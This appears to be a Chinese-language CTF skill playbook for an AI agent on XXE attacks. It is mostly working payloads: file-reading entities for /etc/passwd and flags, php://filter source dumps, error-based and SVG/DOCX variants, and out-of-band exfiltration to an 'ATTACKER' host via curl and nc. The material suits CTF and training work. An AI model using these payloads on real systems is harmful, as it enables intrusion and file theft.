---
name: ctf-web-xxe
description: CTF XXE XML外部实体 攻击 playbook。识别/触发：XXE/XML外部实体/<!ENTITY/SYSTEM/XML输入点/SOAP/SVG/blind OOB/XXE读文件。碰到这些指纹时由二级 ctf-web 路由表调用本 leaf，专项解决"这个考点怎么打"。
---

# CTF XXE XML外部实体 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"这个考点怎么打"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。靶机常不出网 → 优先本地回显路径。

## 识别特征（什么时候调我）
- 请求体是 XML（`Content-Type: application/xml` / `text/xml`），或 JSON 接口可改成 XML 提交（`Content-Type` 切换 + 改头）。
- 报错含 `simplexml_load_string`、`libxml`、`XMLParserError`、`SAXParseException`、`XMLError`、`lxml.etree`。
- 上传/解析 SVG、DOCX/XLSX（zip 内 `word/document.xml`）、XLSM、RSS/OPML、SOAP 接口。
- 抓包看到 `<?xml version=...?>` 或根标签如 `<root>`、`<data>`、`<user>` 手工可改字段值。
- 响应里出现文件内容片段、`/etc/passwd` 字样、或解析后某字段被原样回显（说明实体可被展开并回显 = 经典有回显 XXE）。

## 核心攻击手法

### 0. 先确认 XML 是否会被解析
把原请求 body 换成最小 XML，看是否报错或被接受：
```
<?xml version="1.0" encoding="UTF-8"?><root>test</root>
```
报错 → 多半走了 XML 解析器；接下来试实体展开。

### 1. 有回显 XXE —— 直接读文件（最常见 CTF 姿态）
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><name>&xxe;</name></root>
```
- 根标签/字段名要贴合原请求（`<user>`/`<data>`/`<id>` 等），别硬套 `<foo>`。
- 目标文件：`/flag`、`/flag.txt`、`/flag_is_here`、`/app/flag`、`/var/www/html/flag.php`、`/proc/self/environ`、`/proc/self/cmdline`（常含 flag 路径参数）。
- 读 PHP 源码用 `php://filter`（防止文件被当作 XML 执行/报错）：
```
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
```
回显是 base64，解码即源码。

### 2. 参数实体 —— 当普通实体被过滤或要探测内部 DTD
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
  <!ENTITY % p SYSTEM "http://ATTACKER/x.dtd">
  %p;
]>
<r>&exfil;</r>
```
> CTF 靶机常不出网，`http://ATTACKER` 拉不到。优先试本地 DTD（见 3）或 error-based。

### 3. Error-based XXE（不出网、无回显但有报错）
用参数实体 + 已知公共 DTD 触发解析错误，把文件内容塞进报错信息：
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamsa ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
                         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                         &#x25;eval; &#x25;error; '>
  %local_dtd;
]>
<message>1</message>
```
报错信息里会带 `/etc/passwd` 内容。本地 DTD 候选：`/usr/share/xml/...`、`/opt/.../schema.dtd`，或题目自带 jar/应用 DTD。

### 4. SVG / DOCX / XLSX 载荷（上传点）
SVG 内嵌实体（头像/图片上传走 SVG 渲染）：
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```
DOCX：解压 → 编辑 `word/document.xml` 注入实体 → 重打包上传，回看渲染/转换结果：
```
unzip note.docx -d note && cd note
# 在 word/document.xml 顶部加 DOCTYPE + &xxe; 引用
zip -r ../note.docx .
```

### 5. Blind OOB（CTF 靶机常不出网，最后才试）
> 必须先确认靶机能出网到你控制的服务器。CTF 多数场景连不上，**优先 1/3 本地回显**。
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER:7777/?d=&#x25;file;'>">
```
本机起监听：`nc -lvnp 7777`，或用 DNS exfil。不出网 → 回到 error-based。

## CTF 实战结晶
（待积累，下次遇到本题型回填此处）

## 工具命令
```
# curl 打有回显 XXE（注意 heredoc 避免 shell 转义吃掉 <!）
curl -s -X POST 'http://TARGET/api' \
  -H 'Content-Type: application/xml' \
  --data-binary @- <<'EOF'
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
EOF

# base64 源码读法
curl -s -X POST 'http://TARGET/api' -H 'Content-Type: application/xml' \
  --data-binary '<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><r>&x;</r>'

# 解码
echo 'BASE64HERE' | base64 -d

# Burp Repeater：抓到 XML 请求 → 右键 body 直接改，比 curl 省事（推荐先用 Burp 试通）
```

## 深度参考（穷尽技巧时加载）
- hack-skills-main/skills/xxe-xml-external-entity/SKILL.md
- PayloadsAllTheThings XXE、PortSwigger XXE cheatsheet（按需检索）

## 关联 leaf
- `ctf-web-ssrf`：XXE 的 `SYSTEM` 可指向 `http://内网/...`，常与 SSRF 串用读内网服务。
- `ctf-web-deser`：SOAP/XML 反序列化链路上常先 XXE 再反序列化（如 Java JAXB、PHP）。
- `ctf-web-sqli`：同一登录/上传链多考点题（Fakebook 式链路：sqli → 拿凭据 → XXE/SSRF 读 flag）。
